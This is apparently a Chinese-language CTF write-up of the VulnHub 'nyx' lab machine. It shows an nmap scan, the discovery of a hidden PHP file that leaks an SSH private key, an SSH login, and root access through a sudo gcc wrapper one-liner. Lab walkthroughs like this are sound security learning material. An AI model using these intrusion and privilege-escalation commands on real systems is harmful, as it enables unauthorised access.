# 靶机信息
 nyx是vulnhub中的一台容易类型的CTF类型靶机

# 信息收集
```
┌──(kali㉿kali)-[~]
└─$ nmap -sT --min-rate 10000 -p- 192.168.218.204  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 03:17 EDT
Nmap scan report for 192.168.218.204 (192.168.218.204)
Host is up (0.00045s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:52:69:55 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
```
只开放了两个端口，直接看web服务

# WEB信息枚举
打开网页，查看源代码

<img width="1917" height="724" alt="Image" src="https://github.com/user-attachments/assets/5af37f43-d7e5-42d4-9d28-6b7919910b9a" />

没提示，扫一下目录
扫到一个 key.php 
进去看一下

<img width="1919" height="804" alt="Image" src="https://github.com/user-attachments/assets/18af4b5d-d50f-48fb-a6f6-a6768c45d563" />

有一个输入框，需要 key 值，但是找了一会没有什么发现，发现输入 root 和 admin 有不一样的回显但是之后又没思路了，由于之前扫描的时候只扫了tcp，想着是简单机器就没继续扫了，后面卡了很久，然后无聊就重新跟进了一遍流程在使用 nmap 的 vuln 脚本扫描的时候，还真新扫出来了一个文件，d41d8cd98f00b204e9800998ecf8427e.php 以空字符的 MD5 值作为文件名
访问就拿到了私钥，然后生成公钥

```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/nyx]
└─$ ssh-keygen -y -f ssh_pri.key
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDtP3hOZuqJGVzqMaHpQ4rIpW7H5tiiyQB07Ju2AJ+iHTrgJMctMxMc2ddYjyxPUyXX2y+9UadlkqYNNtL/u46mCya87SmaqKsJWjRS8PRiEpdUTCRO2ZS88E8Be5wZG158lwK0tadJzjIy3NtjNJgS6W1RbkR+qpPB+OHjx/G8uTX+TOc7sSSfGksy6l/qEnM1sYsttHAg14iN0LSTqIx0ytnefnwKGjeSKA0pKpzIGmR48T5G+cIF6C3EFf+bWlSM+NgpjN1nQNE5DJTe3ta7qJfhNbrzxp0eMCBc/sRE3S0vpGgkH28fE7UaYa3kIugkFg0PW4uhNF6nvGQg/DCD mpampis@nyx
```

然后登录
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/nyx]
└─$ ssh -i ssh_pri.key mpampis@192.168.218.204
```

# 提权
```
mpampis@nyx:~$ sudo -l
Matching Defaults entries for mpampis on nyx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mpampis may run the following commands on nyx:
    (root) NOPASSWD: /usr/bin/gcc
mpampis@nyx:~$ 
```
我这里参考的 [GCC](https://gtfobins.github.io/gtfobins/gcc/) 这个网站，十分推荐。

```
mpampis@nyx:~$ sudo gcc -wrapper /bin/sh,-s .
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
提权很简单

# 反思
靶机很简单，但是找入口不容易，本来之前都会进行vuln，恰好今天懒了，没有扫描导致，在入口的地方卡了很久。